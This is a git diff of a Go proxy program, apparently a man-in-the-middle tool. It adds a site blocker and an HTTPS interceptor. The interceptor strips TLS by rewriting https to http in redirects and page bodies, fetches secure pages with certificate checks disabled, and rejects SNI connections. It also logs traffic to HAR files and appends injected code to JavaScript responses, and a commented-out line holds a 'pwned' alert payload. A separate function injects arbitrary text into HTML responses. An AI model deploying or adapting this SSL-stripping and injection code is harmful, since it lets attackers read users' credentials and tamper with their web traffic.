@@ -23,8 +23,10 @@ const (
     CONN_TYPE = "tcp"
 )
 var listener net.Listener
+// var proxy *goproxy.ProxyHttpServer
 
 var banned  = []string {
+	"www.gmail.com",
 	"www.reddit.com",
 	"www.nytimes.com",
 	"www.ft.com",
@@ -66,14 +68,31 @@ func ReplacePage() net.Listener {
 func BlockWebsites() net.Listener {
 	listener, _ = net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
 	proxy := goproxy.NewProxyHttpServer()
-	/*proxy.OnRequest(goproxy.ReqHostIs(banned...)).DoFunc(
-		func(r *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
-				return r, goproxy.NewResponse(r,
-					goproxy.ContentTypeText, http.StatusForbidden,
-					"Blocked Website!")
-		})
-		*/
-	go http.Serve(listener, proxy) // you can probably ignore this error
+  	pageBlocker := goproxy.HandlerFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {
+
+        	body := "<html><body><h1>This site is blocked</h1></body></html>"
+        	client_response_header := make(http.Header)
+        	client_response_header.Add("Content-Type", "text/html" )
+        	client_response := &http.Response{
+				Status: "200 OK", //resp.Status,
+				StatusCode: 200, //resp.StatusCode,
+			  	Proto: "HTTP/1.1", //resp.Proto,
+				ProtoMajor: 1, //resp.ProtoMajor,
+				ProtoMinor: 1, //resp.ProtoMinor,
+				Body: ioutil.NopCloser(bytes.NewBufferString(body)),
+				Header: client_response_header,
+				ContentLength: int64(len(body)),
+			}
+						
+		    log.Println( client_response.Header )
+
+		    ctx.Resp = client_response
+		    ctx.DispatchResponseHandlers()
+			return goproxy.DONE
+	})
+	proxy.HandleRequest(goproxy.RequestHostIsIn(banned...)(pageBlocker))
+		
+	go http.Serve(listener, proxy)
     return listener
 }
 
@@ -105,95 +124,150 @@ func HTTPSInterceptor() net.Listener {
 	proxy := goproxy.NewProxyHttpServer()
 	log.Println("HTTPS Proxy setup and we are listening...")
 
-	//handle SNI headers and print them out
-	// proxy.HandleConnectFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {
-	// 	log.Println("Host: ", ctx.Req.Host)
-	// 	ctx.ResponseWriter.Header().Set("Response", "201")
-	// 	ctx.ResponseWriter.Write([]byte("Hello world"))
-	// 	return goproxy.DONE
-	// })
+	//catch HSTS (i.e it immediately puts an SNI header in place)
+	proxy.HandleConnectFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {
+		ctx.Resp.Request.URL.Scheme = "http"
+		// ctx.Resp.Status
+		//this should try to strip the HTTPS once, if that fails, then reject.
+		if ctx.SNIHost() != "" {
+			return goproxy.REJECT	
+		}
+		return goproxy.NEXT
+		
+	})
 
+	//block pages that are a specific URL (see banned array)
+  	pageBlocker := goproxy.HandlerFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {
+        	body := "<html><body><h1>This site is blocked</h1></body></html>"
+        	client_response_header := make(http.Header)
+        	client_response_header.Add("Content-Type", "text/html" )
+        	client_response := &http.Response{
+				Status: "200 OK",
+				StatusCode: 200,
+			  	Proto: "HTTP/1.1",
+				ProtoMajor: 1,
+				ProtoMinor: 1,
+				Body: ioutil.NopCloser(bytes.NewBufferString(body)),
+				Header: client_response_header,
+				ContentLength: int64(len(body)), 
+			}
+			ctx.ResponseWriter.Header().Set("Content-Type", "text/html")
+			ctx.ResponseWriter.WriteHeader(200)
+			client_response.Write(ctx.ResponseWriter)
+			return goproxy.DONE
+	})
+  	
+  	proxy.NonProxyHandler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		// if r.URL.Path == "/har" {
+			proxy.FlushHARToDisk("/Users/alex/file.har")
+			w.WriteHeader(201)
+			w.Write([]byte("hello world!\n"))
+		// }
+	})
+	
+  	//handle 301 and 302s to HTTPS sites. Drop them to HTTPS only 
+	interceptResponse := goproxy.HandlerFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {
 
-	// proxy.HandleRequestFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {
-	// // if ctx.Host() == "example.com" {
-	// 	log.Println("REQUEST: logging to "+ctx.Host()+".har")
-	// 	ctx.LogToHARFile(true)
-	// 	proxy.FlushHARToDisk("public/hars/"+ctx.Host()+".har")
-	// // }
-	// return goproxy.NEXT
-	// })
-	// proxy.HandleResponseFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {
-	// // if ctx.Host() == "example.com" {
-	// 	log.Println("RESPONSE: logging to "+ctx.Host()+".har")
-	// 	ctx.LogToHARFile(true)
-	// 	proxy.FlushHARToDisk("public/hars/"+ctx.Host()+".har")
-	// // }
-	// return goproxy.NEXT
-	// })
-	// //if you want to flush the HARs manually
-	// proxy.NonProxyHandler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-	// 	if r.URL.Path == "/har" {
-	// 		log.Println("NON PROXY: flushing HAR")
-	// 		proxy.FlushHARToDisk("public/hars/forced.har")
-	// 		w.WriteHeader(201)
-	// 		w.Write([]byte("hello world!\n"))
-	// 	}
-	// })
-
-interceptResponse := goproxy.HandlerFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {
-		// Check if the response from the server is a 301-moved-permanently and redirects to https.
-		log.Println("URL: ", ctx.Resp.Request.URL)
-		if ctx.Resp.Status == "301 Moved Permanently" {
-			log.Println(ctx.Resp.Header.Get("Location"))
+		
+		//if its a redirect
+		if ctx.Resp != nil && (strings.Contains(ctx.Resp.Status, "301") || strings.Contains(ctx.Resp.Status, "302")) {
+			//and its to an HTTPS page
+			//then we kill the original request, and make the connection ourself
 			if strings.Contains(ctx.Resp.Header.Get("Location"), "https") {
-			// if ctx.Resp.Header.Get("Location")[0:5] == "https" {
-				log.Println("...")
-				log.Println("...")
-				log.Println("---->>> CLIENT Requested URL: ", ctx.Resp.Request.URL)
+				ctx.Resp.Request.URL.Scheme = "http"
+				ctx.Resp.Header.Set("Location", strings.Replace(ctx.Resp.Header.Get("Location"), "https", "http", -1))
+				ctx.Resp.Request.URL.Host = strings.Replace(ctx.Host(), "https", "http", -1)
+				log.Println("---->>> CLIENT Requested URL (redirecting): ", ctx.Resp.Request.URL)
 				log.Println("<<<---- SERVER Response 301 to location: ", ctx.Resp.Header.Get("Location"))
-
+	
 				tr := &http.Transport{
 		        	TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 		    	}
 		    	client := &http.Client{Transport: tr}
-		    	// There we go
-		    	// log.Println("---->>> REQUESTING 301 redirect from SERVER: ", ctx.Resp.Header.Get("Location"))
 		    	server_ssl_response, err := client.Get( ctx.Resp.Header.Get("Location") )
 		    	if err != nil {
-		        	log.Println(err)
+		        	log.Println(" help!: ", err)
 		    	}
-
+		    	log.Println(" TLS for: ", server_ssl_response.Header.Get("Location"))
+		    	
+		    	log.Println(server_ssl_response.TLS)
 		    	bs, err := ioutil.ReadAll(server_ssl_response.Body)
 		    	if err != nil {
                		log.Println(err)
             	}
             	body := string(bs)
-            	log.Println("301: body: ", body)	
-				ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))	
+            	body = strings.Replace(body, "https", "http", -1)
+            	client_response_header := make(http.Header)
+            	client_response_header.Add("Content-Type", server_ssl_response.Header.Get("Content-Type") )
+            	client_response := &http.Response{
+					Status: "200 OK", //resp.Status,
+					StatusCode: 200, //resp.StatusCode,
+				  	Proto: "HTTP/1.1", //resp.Proto,
+					ProtoMajor: 1, //resp.ProtoMajor,
+					ProtoMinor: 1, //resp.ProtoMinor,
+					Body: ioutil.NopCloser(bytes.NewBufferString(body)),
+					Header: client_response_header,
+					ContentLength: int64(len(body)),
+				}							
+			    log.Println("HAR PATH: ", "/Users/alex/go/src/mitm/public/hars/"+ctx.Resp.Request.URL.String()+".har")
+			   	// proxy.FlushHARToDisk("/Users/alex/go/src/mitm/public/hars/"+ctx.Resp.Request.URL.String()+".har")
+			    ctx.Resp = client_response
+			    ctx.LogToHARFile(true) //log the HAR files
 			    return goproxy.FORWARD
 
-			} else if ctx.Resp.Header.Get("Location")[0:5] == "http:" {
-				// Redirecting to some HTTP page. Not interested...
+			} else {//if ctx.Resp.Header.Get("Location")[0:5] == "http:" {
+				// Redirecting to some HTTP page.
 				log.Println("Response is HTTP")
 		    	bs, err := ioutil.ReadAll(ctx.Resp.Body)
 		    	if err != nil {
 	           		log.Println(err)
 	        	}
-		        log.Println("BODY: ", string(bs))
+	        	body := string(bs)
+	        	//strip all http out of the page so that a redirect will be required if necessary
+	        	body = strings.Replace(body, "https", "http", -1)
+	        	ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
+		        log.Println("BODY: ", body)
+   			    log.Println("HAR PATH: ", "/Users/alex/go/src/mitm/public/hars/"+ctx.Resp.Request.URL.String()+".har")
+			   	// proxy.FlushHARToDisk("/Users/alex/go/src/mitm/public/hars/"+ctx.Resp.Request.URL.String()+".har")
+			   	ctx.LogToHARFile(true) //log the HAR files
 				return goproxy.NEXT
 			}
-		}
-		log.Println("neither of the above, we are forwarding data")
-    	// bs, err := ioutil.ReadAll(ctx.Resp.Body)
-	    // 	if err != nil {
-     //       		log.Println(err)
-     //    	}
-        // log.Println("HTTP: ", string(bs))
-		return goproxy.NEXT
+
+		} 
+			log.Println("neither of the above, we are forwarding data")
+			if strings.Contains(ctx.Resp.Request.URL.Path, "js") { //catch javascript files to embed the hook into 
+					log.Println("HTTP URL: ", ctx.Resp.Request.URL.Path)
+					bs, err := ioutil.ReadAll(ctx.Resp.Body)
+			    	if err != nil {
+			       		log.Println(err)
+			    	}
+			    	body := string(bs)
+			    	body += "console.log(\"I am here!!!!!\");"
+			    // 	body += "$(document).ready(function() {"+
+						// "alert(\"you have been pwned motherfucker!\")"+
+						// "});"
+					log.Println("JS: ", body)
+
+
+			} else if strings.Contains(ctx.Resp.Request.URL.Path, "css") { //catch css and leave it alone
+
+			} else { //must be an html file or a picture or whatever.
+				bs, err := ioutil.ReadAll(ctx.Resp.Body)
+		    	if err != nil {
+		       		log.Println(err)
+		    	}
+		    	body := string(bs)
+		    	body = strings.Replace(body, "https", "http", -1) //stip all https tags
+		    	//need to inject javascript aswell
+		    	ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
+			}
+		    log.Println("HAR PATH: ", "/Users/alex/go/src/mitm/public/hars/"+ctx.Resp.Request.URL.String()+".har")
+		   	// proxy.FlushHARToDisk("/Users/alex/go/src/mitm/public/hars/"+ctx.Resp.Request.URL.String()+".har")	
+		   	ctx.LogToHARFile(true) //log the HAR files
+			return goproxy.NEXT
 	}) // end of the proxy OnResponse.
 
-
-	// proxy.HandleRequest((catchPost))
+	proxy.HandleRequest(goproxy.RequestHostIsIn(banned...)(pageBlocker))
 	proxy.HandleResponse((interceptResponse))
 
 	go http.Serve(listener, proxy) // you can probably ignore this error
@@ -208,33 +282,27 @@ func InjectScript(replace string, result string) net.Listener {
 	listener, _ = net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
 	proxy := goproxy.NewProxyHttpServer()
 	
-	/*	proxy.OnResponse().DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
+	interceptResponse := goproxy.HandlerFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {
 
-		log.Println("URL: ", resp.Request.URL)
-		contentType := resp.Header.Get("Content-Type")
+		// proxy.OnResponse().DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
+
+		log.Println("URL: ", ctx.Resp.Request.URL)
+		contentType := ctx.Resp.Header.Get("Content-Type")
 			if !strings.Contains(contentType, "html") {
-				return resp	
+				return goproxy.NEXT	
 			}
 			//start reading the response for editing
-			bs, err := ioutil.ReadAll(resp.Body)
+			bs, err := ioutil.ReadAll(ctx.Resp.Body)
 			if err != nil {
 			   log.Println("inject error: ", err)
 			}
 			body := string(bs) //needs to be a string for reading
 			body = strings.Replace(body, replace, result, -1)
 
-			cpy := &http.Response{
-				Status: resp.Status,
-				StatusCode: resp.StatusCode,
-			  	Proto: resp.Proto,
-				ProtoMajor: resp.ProtoMajor,
-				ProtoMinor: resp.ProtoMinor,
-				Body: ioutil.NopCloser(bytes.NewBufferString(body)),
-				ContentLength: int64(len(body)),
-			}
-		    return cpy
+			ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
+		    return goproxy.NEXT
 		})
-	*/
+	proxy.HandleResponse((interceptResponse))
 	go http.Serve(listener, proxy) // you can probably ignore this error
     return listener
 }
